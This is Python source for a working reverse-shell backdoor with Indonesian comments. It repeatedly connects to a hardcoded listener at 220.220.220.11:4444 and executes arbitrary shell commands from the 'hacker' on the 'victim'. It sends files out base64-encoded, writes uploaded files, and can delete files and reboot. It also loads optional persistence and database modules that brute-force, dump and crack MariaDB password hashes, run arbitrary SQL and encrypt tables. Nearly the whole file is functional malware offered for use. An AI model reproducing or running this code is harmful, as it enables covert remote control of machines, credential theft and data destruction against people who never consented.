import socket
import subprocess
import json
import os
import base64
import time

import sys
import os

# JIKA FILE TIDAK ADA, MAKA AKAN MELEWATI TAHAP INI (SKIP)
def check_persistance_file():
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        if current_dir not in sys.path:
            sys.path.append(current_dir)
        
        # MENCOBA IMPORT MODUL PERSISTENCE
        from persistence import make_persistence
        
        print("[DEBUG] [PERSISTENCE] MODUL PERSISTENCE DITEMUKAN")
        return (True, make_persistence)
    
    except ImportError as e:
        print("[DEBUG] [PERSISTENCE_WARNING] GAGAL IMPORT: ", e)
        return (False, None)

def check_database_bypass_file():
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        if current_dir not in sys.path:
            sys.path.append(current_dir)
    
        # IMPORT CLASS DARI FILE DB_BYPASS.PY
        from DB_BYPASS import db_bypass
        
        # [PENTING] BUAT OBJEK DARI CLASS TERSEBUT (INSTANSIASI)
        db_objek = db_bypass()
        
        print("[DEBUG] [DB_BYPASS] MODUL DATABASE_BYPASS DITEMUKAN DAN DI-INSTANSIASI")
        return (True, db_objek)
    
    except ImportError as e:
        print("[DEBUG] [DB_BYPASS] GAGAL IMPORT: ", e)
        return (False, None)
    
    except Exception as e:
        print(f"[DEBUG] [ERROR_DB_BYPASS] : {e}")
        return (False, None)
        

class Backdoor:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        
        # [LANGKAH PERSISTENCE & DB_BYPASS] 
        # DIJALANKAN SEKALI SAAT OBJEK DIBUAT
        (STATUS_PERSISTANCE_FILE, MAKE_PERSISTENCE) = check_persistance_file()
        if STATUS_PERSISTANCE_FILE:
            try:
                # MENJALANKAN SCRIPT "persistance.py"
                STATUS_P = MAKE_PERSISTENCE()
                print(f"[DEBUG] [PERSISTENCE] {STATUS_P}")

            except Exception as E:
                print(f"[DEBUG] [ERROR_PERSISTENCE] GAGAL MENJALANKAN PERSISTENCE: {E}\n")

        else:
            print("[DEBUG] [PERSISTENCE_WARNING] TAHAP PERSISTENCE DILEWATI KARENA MODUL TIDAK ADA\n")

        # [LANGKAH DB_BYPASS] PENGECEKKAN MODUL APAKAH TERSEDIA DAN MENGGUNAKANNYA
        (self.STATUS_DB_BYPASS_FILE, self.DB_BYPASS) = check_database_bypass_file()

    # [LOOP UTAMA RECONNECT]
    # JIKA KONEKSI PUTUS, DIA AKAN KEMBALI KE SINI
    def start_connection(self):
        while True:
            try:
                print(f"[DEBUG] MENCOBA KONEK KE {self.ip}:{self.port}...")
                
                # [LANGKAH 1] BUAT SOCKET BARU SETIAP KALI MENCOBA KONEK
                # SOCKET LAMA YANG SUDAH RUSAK/PUTUS HARUS DIGANTI
                self.koneksi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.koneksi.connect((self.ip, self.port))
                
                print("[DEBUG] [+] TERHUBUNG KE LISTENER!")

                # [LANGKAH 2] JALANKAN FUNGSI TERIMA PERINTAH
                # JIKA HACKER CLOSE TERMINAL, FUNGSI INI AKAN MELEMPAR ERROR/EXCEPTION
                self.run()

            except Exception as e:
                # [LANGKAH 3] PENANGANAN JIKA KONEKSI GAGAL ATAU PUTUS
                print(f"[DEBUG] [-] KONEKSI TERPUTUS/GAGAL. COBA LAGI DALAM 5 DETIK... ({e})")
                
                # TUTUP SOCKET LAMA AGAR TIDAK MEMAKAN MEMORI (ZOMBIE CONNECTION)
                # ZOMBIE CONNECTION, GK ADA KONEKSI TAPI DI ANGGAP ADA KONEKSI 
                # KARENA "koneksi.py" AKTIF DULUAN DARIPADA "listener.py" 
                # KETIKA OS VICTIM NYALA YG DISEBABKAN "persistence.py"
                try:
                    self.koneksi.close()
                except: pass
                
                time.sleep(5)
                continue

    def reliable_send(self, data):
        # [LANGKAH 8] KORBAN MENGIRIM HASIL EKSEKUSI KEMBALI KE HACKER
        print("[DEBUG] [LANGKAH 8] KORBAN MENGIRIM HASIL (JSON) :", data)
        json_data = json.dumps(data)
        self.koneksi.send(json_data.encode())

    def reliable_receive(self):
        # [LANGKAH 6] KORBAN MENERIMA PERINTAH DARI HACKER
        print("[DEBUG] [LANGKAH 6] KORBAN MENUNGGU PERINTAH DARI HACKER...")
        json_data = ""
        while True:
            try:
                chunk = self.koneksi.recv(1024)
                if not chunk:
                    return None
                
                # print("[DEBUG] VICTIM RECV RAW : ", chunk) # OPSI JIKA INGIN MELIHAT DATA MENTAH
                json_data += chunk.decode()
                print("[DEBUG] [LANGKAH 6] KORBAN MENERIMA JSON STRING :", json_data)
                
                return json.loads(json_data)
            except ValueError:
                # LANJUT MENERIMA JIKA DATA JSON BELUM LENGKAP
                continue

    def eksekusi_system_command(self, command):
        # [LANGKAH 7] MENGEKSEKUSI PERINTAH DI OS KORBAN
        print("[DEBUG] [LANGKAH 7] MENGEKSEKUSI PERINTAH DI TERMINAL/CMD KORBAN:", command)
        # JIKA GAGAL → TANGKAP ERROR AGAR SCRIPT TIDAK CRASH (MATI)
        try:
            return subprocess.check_output(" ".join(command), shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            # JIKA COMMAND ERROR, AMBIL OUTPUT ERROR NYA
            return e.output

    def peralihan_directory(self, path):
        print("[DEBUG] MELAKUKAN PINDAH DIREKTORI (CD)")
        os.chdir(path)
        return " [+] Beralih ke directory " + path
        
    def read_file(self, path):
        # KHUSUS FILE (BINARY → BASE64 → JSON) UNTUK DIKIRIM KE HACKER (DOWNLOAD)
        print("\n[DEBUG] START READ FILE (BASE64) DARI KORBAN")
        with open(path, "rb") as file:
            file_data = file.read()

        # ENCODE KE BASE64 (BYTES → STRING)
        encoded = base64.b64encode(file_data).decode()
        print("[DEBUG] BASE64 ENCODE SELESAI")
        return encoded
        
    def download_file(self, path, data):
        # MENDAPATKAN FILE DARI KIRIMAN HACKER (UPLOAD DARI SISI HACKER)
        print("\n[DEBUG] START DECODE FILE (BASE64) DI KORBAN")
        try:
            # DECODE BASE64 → BYTES
            file_data = base64.b64decode(data)
        except Exception as e:
            return "[ERROR] GAGAL DECODE BASE64 : " + str(e)

        try:
            with open(path, "wb") as file:
                file.write(file_data)
        except Exception as e:
            return "[ERROR] GAGAL MENYIMPAN FILE : " + str(e)

        return "[+] UPLOAD FILE DARI HACKER BERHASIL"

    def run(self):
        while True:
            # SIKLUS UTAMA BACKDOOR BERADA DI SINI
            try:
                command = self.reliable_receive()
                if not command:
                    # JIKA DATA KOSONG, BERARTI HACKER CLOSE TERMINAL
                    print("[DEBUG] KONEKSI HILANG. KELUAR DARI MODE RUN.")
                    break

                if command[0] == "exit":
                    print(f"[DEBUG] PERINTAH {command[0]} DITERIMA. MENUTUP KONEKSI.\n")
                    self.koneksi.close()
                    break
                
                elif command[0] == "reboot":
                    try:
                        # MENGIRIM NOTIFIKASI KE LISTENER SEBELUM KONEKSI TERPUTUS
                        print("[REBOOT] PERINTAH REBOOT DITERIMA. KONEKSI AKAN TERPUTUS DALAM 2 DETIK...")
                        print("[DEBUG] EKSEKUSI PERINTAH REBOOT SISTEM...")
                        
                        time.sleep(3)
                        self.reliable_send(f"[REBOOT] SYSTEM BERHASIL MELAKUKAN REBOOTING")
                        
                        self.koneksi.close()

                        # MENCOBA REBOOT DENGAN MULTIPLE FALLBACK (SUDO & PATH ABSOLUT)
                        # MENGGUNAKAN SHELL=TRUE AGAR PERINTAH SISTEM TERDETEKSI
                        subprocess.run("reboot || sudo reboot || /sbin/reboot", shell=True)
                        
                        # MEMASTIKAN PROSES PYTHON BERHENTI TOTAL
                        os._exit(0)
                    except Exception as e:
                        print(f"[ERROR REBOOT] GAGAL MELAKUKAN REBOOT: {str(e).upper()}")
                
                elif command[0] == "shutdown_backdoor":
                    print("[DEBUG] PERINTAH SHUTDOWN DITERIMA, MEMATIKAN BACKDOOR TOTAL DALAM 3 DETIK...")
                    time.sleep(3)
                    
                    self.reliable_send(f"[SHUTDOWN BACKDOOR] BACKDOOR BERHASIL MATI TOTAL")
                    
                    self.koneksi.close()
                    os._exit(0)
                
                # PERINTAH UNTUK MENGUBAH IZIN AKES USER PADA FILE TERTENTU DI VICTIM
                elif command[0] == "chmod":
                    print(f"[DEBUG] EKSEKUSI CHMOD: {' '.join(command)}")
                    try:
                        # EKSEKUSI PERINTAH CHMOD DI TERMINAL KORBAN
                        self.eksekusi_system_command(command)
                        command_result = f"[+] BERHASIL: IZIN FILE '{command[2]}' TELAH DIUBAH MENJADI '{command[1]}'"
                    except Exception as e:
                        command_result = f"[ERROR] GAGAL CHMOD: {str(e)}"
                    
                    self.reliable_send(command_result)
                    continue
                
                elif command[0] == "rm": # KALAU KORBANG NYA KALI LINUX
                    print(f"[DEBUG] EKSEKUSI PENGHAPUSAN: {' '.join(command)}")
                    
                    try:
                        # JALANKAN PERINTAH DARI HACKER
                        raw_output = self.eksekusi_system_command(command).decode(errors="ignore")
                        
                        # JIKA OUTPUT KOSONG, BERARTI BERHASIL (SILENT SUCCESS)
                        if not raw_output.strip(): 
                            command_result = f"[+] BERHASIL: File/Folder '{command[-1]}' telah dihapus."
                        else:
                            command_result = raw_output # JIKA ADA PESAN (MISAL ERROR), TAMPILKAN ITU
                            
                    except Exception as e:
                        command_result = f"[ERROR] GAGAL MENGHAPUS: {str(e)}"
                    
                    # KIRIM HASIL KE HACKER
                    self.reliable_send(command_result)
                    continue

                # PROSES PEMINDAHAN / RENAME DI SISI KORBAN
                elif command[0] == "mv":
                    print(f"[DEBUG] PERINTAH MV DITERIMA: {command[1]} -> {command[2]}")
                    
                    try:
                        # EKSEKUSI PERINTAH LEWAT SYSTEM (LINUX: mv, WINDOWS: move)
                        # CATATAN: JIKA KORBAN WINDOWS, HACKER HARUS KETIK 'move' BUKAN 'mv'
                        raw_output = self.eksekusi_system_command(command).decode(errors="ignore")
                        
                        # LOGIKA JIKA BERHASIL (BIASANYA OUTPUTNYA KOSONG)
                        if not raw_output.strip():
                            command_result = f"[+] BERHASIL: '{command[1]}' TELAH DIPINDAHKAN/DIUBAH KE '{command[2]}'"
                        else:
                            command_result = raw_output
                            
                    except Exception as e:
                        command_result = f"[ERROR] GAGAL MEMINDAHKAN: {str(e)}"
                    
                    # [LANGKAH 8] KIRIM STATUS KE LISTENER
                    self.reliable_send(command_result)
                    continue

                elif command[0] == "cd" and len(command) > 1:
                    try:
                        command_result = self.peralihan_directory(command[1])
                    except Exception as e:
                        command_result = "[ERROR] : " + str(e)

                elif command[0] == "download":
                    try:
                        command_result = self.read_file(command[1])
                    except Exception as e:
                        command_result = "[ERROR] : " + str(e)
                        
                    # LANGSUNG KIRIM HASILNYA LALU KEMBALI KE AWAL LOOP
                    self.reliable_send(command_result)
                    continue
                        
                elif command[0] == "upload":
                    try:
                        command_result = self.download_file(command[1], command[2])
                    except Exception as e:
                        command_result = "[ERROR] : " + str(e)

                    # KIRIM STATUS KE LISTENER
                    self.reliable_send(command_result)
                    continue
                
                # ==============================================================
                # STRATEGI SQL_INJECTION
                # ==============================================================
                # [OPSI 1] COMMAND: db_brute
                # FORMAT: db_brute [file_combo]
                # ==============================================================
                elif command[0] == "db_brute":
                    if self.STATUS_DB_BYPASS_FILE:
                        try:
                            combo_file = command[1]
                            target = self.DB_BYPASS.brute_force_accounts(combo_file)
                            if target:
                                command_result = f"[+] PASSWORD DITEMUKAN: {target['user']}:{target['password']}"
                            else:
                                command_result = "[!] GAGAL: Tidak ada akun yang cocok di wordlist."
                        except Exception as e:
                            command_result = f"[ERROR] Brute Force: {str(e)}"
                    else:
                        command_result = "[!] Modul DB_BYPASS.py tidak ditemukan."
                    
                    self.reliable_send(command_result)
                    continue

                # ==============================================================
                # [OPSI 2] COMMAND: db_steal
                # FORMAT: db_steal [user] [password]
                # ALUR: DUMP HASIL PASSWORD DARI DATABASE INTERNAL MARIADB
                # ==============================================================
                elif command[0] == "db_steal":
                    if self.STATUS_DB_BYPASS_FILE:
                        try:
                            # KITA HANYA BUTUH USER DAN PASSWORD UNTUK DUMPING METADATA
                            user, pwd = command[1], command[2]
                            
                            # MEMANGGIL FUNGSI BARU YANG MENGAMBIL TABEL MYSQL.USER
                            command_result = self.DB_BYPASS.steal_database_passwords(user, pwd)
                            
                            print("\n" + "=" * 50)
                            print("     HASIL EKSFILTRASI PASSWORD DATABASE")
                            print("=" * 50)
                            print(command_result)
                            print("=" * 50)
                        except Exception as e:
                            command_result = f"[ERROR] Steal DB Passwords: {str(e)}"
                    else:
                        command_result = "[!] Modul DB_BYPASS.py tidak ditemukan."
                    
                    self.reliable_send(command_result)
                    continue

                # ==============================================================
                # [OPSI 3] COMMAND: db_crack
                # FORMAT: db_crack [hash_target] [file_wordlist]
                # ==============================================================
                elif command[0] == "db_crack":
                    if self.STATUS_DB_BYPASS_FILE:
                        try:
                            target_hash = command[1]
                            wordlist_file = command[2]
                            
                            print("[*] MENJALANKAN PROSES OFFLINE CRACKING...")
                            plain_text = self.DB_BYPASS.crack_mysql_hash(target_hash, wordlist_file)
                            
                            if plain_text:
                                command_result = f"[+] HASH CRACKED! PASSWORD ASLI: {plain_text}"
                            else:
                                command_result = "[!] GAGAL: Password tidak ditemukan di dalam wordlist."
                        except Exception as e:
                            command_result = f"[ERROR] Cracking: {str(e)}"
                    else:
                        command_result = "[!] Modul DB_BYPASS.py tidak ditemukan."
                    
                    self.reliable_send(command_result)
                    continue
                
                # ==============================================================
                # [OPSI 4] COMMAND: db_query
                # FORMAT: db_query [user] [password/None] [query]
                # ==============================================================
                elif command[0] == "db_query":
                    if self.STATUS_DB_BYPASS_FILE:
                        try:
                            user = command[1]
                            # Jika password ditulis 'None', gunakan bypass root (tanpa password)
                            pwd = None if command[2].lower() == "none" else command[2]
                            sql_query = " ".join(command[3:])
                            
                            command_result = self.DB_BYPASS.execute_custom_query(sql_query, user, pwd)
                        except Exception as e:
                            command_result = f"[ERROR] SQL Query: {str(e)}"
                    else:
                        command_result = "[!] Modul DB_BYPASS.py tidak ditemukan."
                    
                    self.reliable_send(command_result)
                    continue
                
                # ==============================================================
                # UTILITY ENKRIPSI / DEKRIPSI DATABASE
                # ==============================================================
                # FORMAT UTUH: [simulate_encrypt/simulate_decrypt] [user] [password] [nama_database] [nama_tabel] [file_kunci]
                # ==============================================================
                elif command[0] == "simulate_encrypt" or command[0] == "simulate_decrypt":
                    print(f"[DEBUG] MENJALANKAN '{command[0]}' DENGAN PARAMETER DINAMIS")
                    
                    try:
                        # MENENTUKAN COMMAND SKRIP FILE PYTHON YG DI GUNAKAN
                        if command[0] == "simulate_encrypt":
                            script_name = "encrypt_simulasi.py"
                        else:
                            script_name = "decrypt_simulasi.py"

                        # VALIDASI JUMLAH ARGUMEN YANG MASUK
                        if len(command) >= 6:
                            db_user = command[1]
                            db_password = command[2]
                            db_database = command[3]
                            db_table = command[4]
                            key_file = command[5]
                            
                            # MENGIRIM PARAMETER SEBAGAI ARGUMEN FUNGSI
                            command = ["python3", script_name, db_user, db_password, db_database, db_table, key_file]
                        else:
                            print("[DEBUG WARNING] ARGUMEN TIDAK LENGKAP SILAKHKAN COBA ULANG")
                            continue

                        raw_output = self.eksekusi_system_command(command)
                        
                        if raw_output:
                            command_result = f"[+] {command[0].upper()} BERHASIL BERJALAN:\n" + raw_output.decode(errors="ignore")
                        else:
                            command_result = f"[+] {command[0].upper()} SELESAI (TANPA OUTPUT DI TERMINAL)"

                    except Exception as e:
                        command_result = f"[ERROR] KEGAGALAN EKSEKUSI DI TARGET: {e}"

                    self.reliable_send(command_result)
                    continue
                
                else:
                    # EKSEKUSI PERINTAH SYSTEM STANDAR (DIR, LS, WHOAMI, DLL)
                    try:
                        command_result = self.eksekusi_system_command(command).decode(errors="ignore")
                    except Exception as e:
                        command_result = "[ERROR] : " + str(e)
                
                # SETELAH EKSEKUSI, KIRIM HASIL KE HACKER (LANGKAH 8)
                self.reliable_send(command_result)
                
            except Exception as e:
                print(f"[DEBUG] ERROR SAAT MENERIMA PERINTAH: {e}")
                break 
                
# PASTIKAN IP SAMA DENGAN IP LISTENER
my_backdoor = Backdoor("220.220.220.11", 4444)
my_backdoor.start_connection()